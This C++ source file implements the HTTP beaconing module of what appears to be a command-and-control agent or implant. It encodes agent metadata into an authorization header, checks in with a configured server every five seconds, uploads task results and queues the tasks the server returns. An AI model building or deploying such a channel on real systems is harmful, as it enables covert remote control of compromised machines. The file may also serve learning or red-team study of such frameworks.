#include <iostream>
#include <string>
#include "HTTPCommunicationModule.h"
#include "Helpers.h"


HTTPCommunicationModule::HTTPCommunicationModule(const std::string& address, int port, Agent& agent_ref)
	: Address(address), Port(port), httpClient(), running(false), agent(agent_ref)
{
}

void HTTPCommunicationModule::Config(){
	AgentMetadata metadata = agent.getMetadata();
	std::string metadata_str = metadata.to_json();
	std::string metadata_encoded = base64_encode(metadata_str);
	std::cout << "Metadata JSON: " << metadata_encoded << std::endl;
	headers = {
				L"Content-Type: application/json",
				L"User-Agent: MyHttpClient/1.0",
				L"Authorization: Bearer " + s2ws(metadata_encoded)
			};
	running = true;
}

void HTTPCommunicationModule::Start() {
	while (running) {
		Checkin(); //Send Results
		Sleep(5000); // Espera 5 segundos entre cada ciclo
	}
			
}

void HTTPCommunicationModule::Stop() {
	running = false;
}

void HTTPCommunicationModule::Checkin(){

	//Get TaskResults
	std::vector<TaskResult> results = agent.getTaskResults();
	std::string data = "{\"results\":" + arrayTaskResult2json(results) + "}";

	//Send POST request with Results
	HttpResponse response = httpClient.Post(s2ws(Address), Port, L"/", data, headers);
	std::cout << "Response Body: " << response.body << std::endl;

	//Get a response with Tasks
	std::string tasks_string = response.body.substr(10);
	tasks_string.pop_back();
	std::cout << "Tasks String: " << tasks_string << std::endl;
	std::vector<Task> tasks = json2arrayTasks(tasks_string);

	//Save Tasks to a list
	for (int i = 0; i < tasks.size(); i++) {
		Task task = tasks[i];
		agent.addTask(task);
	}
}

